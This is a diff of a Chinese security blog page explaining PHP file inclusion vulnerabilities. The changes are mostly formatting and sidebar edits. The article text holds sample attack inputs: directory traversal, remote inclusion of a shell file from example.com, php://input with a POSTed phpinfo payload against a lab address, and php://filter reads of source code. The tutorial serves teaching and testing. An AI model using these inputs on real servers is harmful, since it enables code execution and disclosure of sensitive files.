@@ -5,8 +5,7 @@
 <head><meta name="generator" content="Hexo 3.9.0">
     <meta charset="utf-8">
     <meta name="keywords" content="文件操作, Scorpio">
-    <meta name="description" content="文件操作(文件包含、文件读取、文件删除)
-文件包含简述&amp;amp;&amp;amp;&amp;amp;原理如果允许客户端用户输入控制动态包含在服务器端的文件，会导致恶意代码的执行以及敏感信息的泄露，主要包括本地文件和远程文件包含。文件包含是php脚本的一大特">
+    <meta name="description" content="文件包含简述&amp;amp;&amp;amp;&amp;amp;原理如果允许客户端用户输入控制动态包含在服务器端的文件，会导致恶意代码的执行以及敏感信息的泄露，主要包括本地文件和远程文件包含。文件包含是php脚本的一大特色，程序员们为了开发的方便，常常会用到包含">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -446,16 +445,15 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <p>文件操作(文件包含、文件读取、文件删除)<a id="more"></a></p>
-<h3 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h3><h3 id="简述-amp-amp-amp-原理"><a href="#简述-amp-amp-amp-原理" class="headerlink" title="简述&amp;&amp;&amp;原理"></a>简述&amp;&amp;&amp;原理</h3><p>如果允许客户端用户输入控制动态包含在服务器端的文件，会导致恶意代码的执行以及敏感信息的泄露，主要包括本地文件和远程文件包含。文件包含是php脚本的一大特色，程序员们为了开发的方便，常常会用到包含。比如把一系列功能函数都写进fuction.php中，之后当某个文件需要调用的时候就直接在文件头中写上一句<?php include fuction.php?>就可以调用内部定义的函数。</p>
+                <h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><h3 id="简述-amp-amp-amp-原理"><a href="#简述-amp-amp-amp-原理" class="headerlink" title="简述&amp;&amp;&amp;原理"></a>简述&amp;&amp;&amp;原理</h3><p>如果允许客户端用户输入控制动态包含在服务器端的文件，会导致恶意代码的执行以及敏感信息的泄露，主要包括本地文件和远程文件包含。文件包含是php脚本的一大特色，程序员们为了开发的方便，常常会用到包含。比如把一系列功能函数都写进fuction.php中，之后当某个文件需要调用的时候就直接在文件头中写上一句<?php include fuction.php?>就可以调用内部定义的函数。</p>
 <h3 id="常见包含函数：include-require"><a href="#常见包含函数：include-require" class="headerlink" title="常见包含函数：include(),require()"></a>常见包含函数：include(),require()</h3><p>区别：</p>
 <ul>
 <li>include是当代码执行到他的时候才加载文件，发生错误的时候只是发出警告，但仍然继续执行</li>
 <li>require是只要执行就会立即调用文件，发生错误的时候会报错，并且终止脚本的运行<br>require一般是用于<code>文件头包含类文件、数据库</code>等等文件。。。而include一般是用于包含<code>html</code>模板文件</li>
 </ul>
 <h3 id="本地包含"><a href="#本地包含" class="headerlink" title="本地包含"></a>本地包含</h3><h4 id="1-包含目录文件"><a href="#1-包含目录文件" class="headerlink" title="1.包含目录文件"></a>1.包含目录文件</h4><p>？f=text.txt<br>如果里面的内容是php，则继续当成php执行，如果不是php则会读取文件内容<br>？f=./../text.txt<br><code>./</code>是当前目录<code>../</code>是上一级目录。这样来遍历目录来读取文件</p>
-<h4 id="远程包含"><a href="#远程包含" class="headerlink" title="远程包含"></a>远程包含</h4><h5 id="1-远程代码执行："><a href="#1-远程代码执行：" class="headerlink" title="1.远程代码执行："></a>1.远程代码执行：</h5><p>?file=[http|https|ftp]://example.com/shell.txt</p>
-<h5 id="2-利用php流input-接受POST过来的值-："><a href="#2-利用php流input-接受POST过来的值-：" class="headerlink" title="2.利用php流input(接受POST过来的值)："></a>2.利用php流input(接受POST过来的值)：</h5><p>?file=php://input<br>eg</p>
+<h3 id="远程包含"><a href="#远程包含" class="headerlink" title="远程包含"></a>远程包含</h3><h4 id="1-远程代码执行："><a href="#1-远程代码执行：" class="headerlink" title="1.远程代码执行："></a>1.远程代码执行：</h4><p>?file=[http|https|ftp]://example.com/shell.txt</p>
+<h4 id="2-利用php流input-接受POST过来的值-："><a href="#2-利用php流input-接受POST过来的值-：" class="headerlink" title="2.利用php流input(接受POST过来的值)："></a>2.利用php流input(接受POST过来的值)：</h4><p>?file=php://input<br>eg</p>
 <pre><code>http://192.168.227.128/other/lfi/ex1.php?f=php://input
 &lt;?php phpinfo();?&gt;(ps.经过post)</code></pre><h5 id="3-利用php流filter"><a href="#3-利用php流filter" class="headerlink" title="3.利用php流filter"></a>3.利用php流filter</h5><p>php://filter是一种元封装器， 设计用于数据流打开时的筛选过滤应用。<br>include “test.php” php文件包含，在执行流中插入写在其他文件中的有用的代码。读取的时候也是数据流形式，因此可以使用php://filter进行过滤，返回值为0,1。<br>readfile(“test.php”)是将文件以数据流的形式取过来，并不会执行，但会在前台浏览器上进行解析。返回值是字节数多少。<br><code>?file=php://filter/convert.base64-encode/resource=index.php</code></p>
 <h4 id="这里就可以顺带提一下php-输入输出流"><a href="#这里就可以顺带提一下php-输入输出流" class="headerlink" title="这里就可以顺带提一下php://输入输出流"></a>这里就可以顺带提一下php://输入输出流</h4><p>PHP提供了php://的协议允许访问PHP的输入输出流、标准输入输出流和错误描述符，内存中、磁盘备份的临时文件流以及可以操作其他读取写入文件资源的过滤器。提供一些访问方式来使用这些封装器</p>
@@ -789,14 +787,6 @@ Content-Type: text/html
                     <div class="summary block-with-text">
                         
                             php弱类型
-PHP弱类型变量类型（8种）
-标准类型：boolen(布尔),integer(整型),float,string
-
-复杂类型：array,object
-
-特殊类型：resource,null
-类型转换问题  
-这里输出的是is 
                         
                     </div>
                     <div class="publish-info">
@@ -846,13 +836,6 @@ PHP弱类型变量类型（8种）
                     <div class="summary block-with-text">
                         
                             PHP中的命令执行
-PHP中命令执行漏洞常见的危险函数eval()这个是我目前见过最多的危险函数
-
-mixed eval(string $code)
-
-吧字符串code作为php代码执行eg.
-&lt;?php
-eval ($_GET[&#
                         
                     </div>
                     <div class="publish-info">
@@ -1033,7 +1016,7 @@ eval ($_GET[&#
 
             
                 &nbsp;<i class="fa fa-area-chart"></i>&nbsp;站点总字数:&nbsp;
-                <span class="white-color">49.1k</span>
+                <span class="white-color">48.8k</span>
             
 
             
